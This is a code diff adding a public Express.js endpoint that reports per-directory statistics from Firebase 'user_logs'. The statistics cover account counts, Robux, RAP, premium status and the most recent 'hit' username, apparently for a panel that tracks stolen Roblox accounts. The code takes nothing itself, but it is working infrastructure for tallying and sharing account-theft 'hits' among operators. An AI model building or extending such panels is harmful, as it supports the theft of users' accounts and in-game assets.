@@ -518,6 +518,110 @@ app.get('/api/live-hits', async (req, res) => {
   }
 });
 
+// Public API endpoint for bots to get directory stats
+app.get('/api/bot/stats/:directory', async (req, res) => {
+  try {
+    const directoryName = req.params.directory;
+    
+    // Load directories to verify the directory exists
+    const directories = await loadDirectories();
+    
+    // Check if directory exists (including subdirectories)
+    let directoryExists = false;
+    let targetDirectory = directoryName;
+    
+    if (directories[directoryName]) {
+      directoryExists = true;
+    } else {
+      // Check if it's a subdirectory format (parent/sub)
+      const parts = directoryName.split('/');
+      if (parts.length === 2) {
+        const [parentDir, subDir] = parts;
+        if (directories[parentDir] && 
+            directories[parentDir].subdirectories && 
+            directories[parentDir].subdirectories[subDir]) {
+          directoryExists = true;
+          targetDirectory = directoryName;
+        }
+      }
+    }
+    
+    if (!directoryExists) {
+      return res.status(404).json({ 
+        error: 'Directory not found',
+        directory: directoryName
+      });
+    }
+
+    // Get user logs from Firebase
+    const logsRef = db.ref('user_logs');
+    const snapshot = await logsRef.once('value');
+    const allLogs = snapshot.val() || {};
+    
+    // Filter logs for this specific directory
+    const directoryLogs = Object.values(allLogs).filter(log => {
+      if (!log.context) return false;
+      
+      // For direct directory matches
+      if (log.context.directory === targetDirectory) return true;
+      
+      // For subdirectory matches
+      if (log.context.subdirectory && 
+          `${log.context.directory}/${log.context.subdirectory}` === targetDirectory) {
+        return true;
+      }
+      
+      return false;
+    });
+
+    const today = new Date().toDateString();
+    const todayLogs = directoryLogs.filter(log => {
+      const logDate = new Date(log.timestamp).toDateString();
+      return logDate === today;
+    });
+
+    // Calculate statistics
+    const totalAccounts = directoryLogs.length;
+    const totalSummary = directoryLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
+    const totalRobux = directoryLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
+    const totalRAP = directoryLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);
+    
+    const todayAccounts = todayLogs.length;
+    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
+    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
+    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);
+
+    // Get last hit info
+    const lastHit = directoryLogs.length > 0 
+      ? directoryLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0]
+      : null;
+
+    res.json({
+      directory: targetDirectory,
+      stats: {
+        totalAccounts,
+        totalSummary,
+        totalRobux,
+        totalRAP,
+        todayAccounts,
+        todaySummary,
+        todayRobux,
+        todayRAP
+      },
+      lastHit: lastHit ? {
+        username: lastHit.userData.username || 'Unknown',
+        timestamp: lastHit.timestamp,
+        robux: lastHit.userData.robux || 0,
+        premium: lastHit.userData.premium || false
+      } : null
+    });
+
+  } catch (error) {
+    console.error('Error getting bot stats:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 // API endpoint for admin stats (protected)
 app.get('/api/admin/stats', requireAdminPassword, async (req, res) => {
   try {
